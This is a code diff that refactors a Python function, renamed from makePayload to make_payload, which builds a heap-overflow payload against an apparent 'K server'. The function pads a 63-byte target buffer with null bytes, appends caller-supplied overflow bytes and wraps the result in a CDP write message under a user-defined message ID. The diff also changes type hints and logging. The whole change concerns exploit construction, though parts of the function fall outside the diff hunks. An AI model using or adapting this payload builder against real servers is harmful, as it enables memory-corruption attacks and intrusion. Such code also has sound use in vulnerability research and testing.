@@ -1,20 +1,17 @@
+from logging import getLogger
 import math
 import struct
 
-from dam_k_server_hbbo_001.customized_logger import getLogger
+__K_SERVER_USER_DEFINED_MESSAGE_ID: bytes = b"\xf8\xff"
+__K_SERVER_CDP_WRITE_CD_MESSAGE_ID: bytes = b"\x01\x0b"
+__DAM_ENTRY_NUMBER_LENGTH: int = 0x11
+__K_SERVER_TARGET_BUFFER_LENGTH: int = 63
 
-__K_SERVER_USER_DEFINED_MESSAGE_ID = b"\xf8\xff"
-__K_SERVER_CDP_WRITE_CD_MESSAGE_ID = b"\x01\x0b"
-__DAM_ENTRY_NUMBER_LENGTH = 0x11
-__K_SERVER_TARGET_BUFFER_LENGTH = 63
-
-__logger = getLogger("DamKServerHbbo001")
+__logger = getLogger(__name__)
 
 
-def makePayload(heap_overflow_payload=b"A" * 0x08):
-    __logger.info(f"heap_overflow_payload={heap_overflow_payload}")
+def make_payload(heap_overflow_payload: bytes):
     overflow_length = len(heap_overflow_payload)
-    __logger.info(f"overflow_length={hex(overflow_length)}")
     heap_payload = b"\x00" * __K_SERVER_TARGET_BUFFER_LENGTH + heap_overflow_payload
 
     # Padding
@@ -41,5 +38,6 @@ def makePayload(heap_overflow_payload=b"A" * 0x08):
     payload: bytes = __K_SERVER_USER_DEFINED_MESSAGE_ID
     payload += struct.pack(">H", len(cdp_write_cd_message))
     payload += cdp_write_cd_message
-    __logger.info(f"payload={payload.hex()}")
+    __logger.debug(f"{heap_overflow_payload.hex()=} {hex(overflow_length)=}")
+    __logger.debug(f"{payload.hex()=}")
     return payload
